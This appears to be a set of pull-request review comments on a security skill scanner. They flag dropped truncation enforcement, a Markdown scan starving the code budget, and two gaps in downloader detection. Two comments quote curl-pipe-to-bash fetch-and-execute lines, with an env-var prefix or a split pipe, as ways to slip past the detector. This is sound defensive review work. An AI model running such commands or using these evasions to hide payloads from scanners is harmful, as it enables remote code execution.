Full review comments:

- **[P1] Preserve scanner summary and option contracts:** `src/security/skill-scanner.ts:21-34`
  - body: Current main exposes `SkillScanSummary.truncated` plus option fields for hidden directories, node_modules, nested test files, and `onlyIncludeFiles`, and install scanning uses those fields to fail closed on truncation. This PR head drops that contract, so a current-main rebase must keep the existing shape instead of silently removing truncation enforcement or breaking callers.
  - confidence: 0.93
- **[P1] Keep Markdown scans from consuming the code budget:** `src/security/skill-scanner.ts:817-828`
  - body: This walks SKILL.md files first with the full `maxFiles` budget and then scans only the remaining budget for code files. A package with many skill Markdown files can prevent JS/TS files from being scanned, weakening existing critical rules like `dangerous-exec`; keep code coverage intact and account for Markdown coverage separately.
  - confidence: 0.9
- **[P2] Skip assignment words before downloader matching:** `src/security/skill-scanner.ts:486-505`
  - body: Bash accepts environment assignments before a command, but `isDownloadCommandSegment` returns on the first token that is not sudo/doas/env. A line like `HTTPS_PROXY=http://p curl -fsSL https://x | bash` therefore misses the new critical Markdown finding even though it downloads and executes content.
  - confidence: 0.88
- **[P2] Fold pipe-ended markdown pipeline continuations:** `src/security/skill-scanner.ts:365-372`
  - body: `logicalMarkdownLines` only joins backslash continuations, so a valid shell pipeline split as `curl -fsSL https://x |` followed by `bash` is evaluated as two separate lines and produces no downloader-to-interpreter match. Join pipe-ended continuations or add equivalent parser handling before matching.
  - confidence: 0.82
